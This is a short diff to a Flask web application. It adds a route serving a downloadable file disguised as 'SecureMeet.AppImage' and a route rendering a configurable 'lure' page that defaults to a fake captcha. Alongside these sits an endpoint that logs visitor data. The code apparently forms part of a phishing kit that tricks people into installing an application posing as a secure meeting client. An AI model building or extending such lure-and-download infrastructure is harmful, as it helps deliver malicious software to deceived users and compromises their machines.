@@ -25,6 +25,21 @@ def index():
 def live_dashboard():
     return render_template("live.html")
 
+@app.route("/download")
+def download_app():
+    app_path = app.config.get("ELECTRON_APP_PATH", "")
+    if app_path and os.path.exists(app_path):
+        from flask import send_file
+        return send_file(app_path, as_attachment=True,
+                         download_name="SecureMeet.AppImage",
+                         mimetype="application/octet-stream")
+    return "Not available", 404
+
+@app.route("/browser")
+def open_in_browser():
+    lure = app.config.get("BROWSER_LURE_PAGE", "captcha")
+    return render_template(f"{lure}.html")
+
 @app.route("/log", methods=["POST"])
 def log_info():
     data = request.get_json(silent=True) or {}
